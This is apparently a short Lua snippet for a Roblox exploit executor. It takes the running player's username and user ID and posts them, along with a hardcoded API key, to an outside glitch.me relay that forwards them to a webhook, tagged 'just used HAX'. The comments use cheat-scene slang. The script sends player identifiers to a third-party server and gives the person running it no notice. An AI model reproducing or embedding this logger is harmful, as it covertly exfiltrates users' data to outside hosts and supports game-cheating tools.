local ign = game.Players.LocalPlayer.Name
local id = game.Players.LocalPlayer.UserId
-- create ur local to log something else
local function log(message)
 local api = "http://buritoman69.glitch.me/webhook" -- credits to owner + to make sure it work on every exploit
 local Body = {
   ['Key'] = "applesaregood", -- api owner's apikey
   ['Message'] = tostring(message), -- using that at line 14
   ['Name'] = "big whitehat stuff", -- using api and skiddin stuff cause lazy  ^^
   ['Webhook'] = "urlhere " -- or php and syn.request to make sure ur webhook doesnt get trashed on
 }
 local data = game:HttpPost(api, game:GetService("HttpService"):JSONEncode(Body), false, "application/json")
 return data or nil
end
log(ign.. "   " ..id.. "   just used HAX")
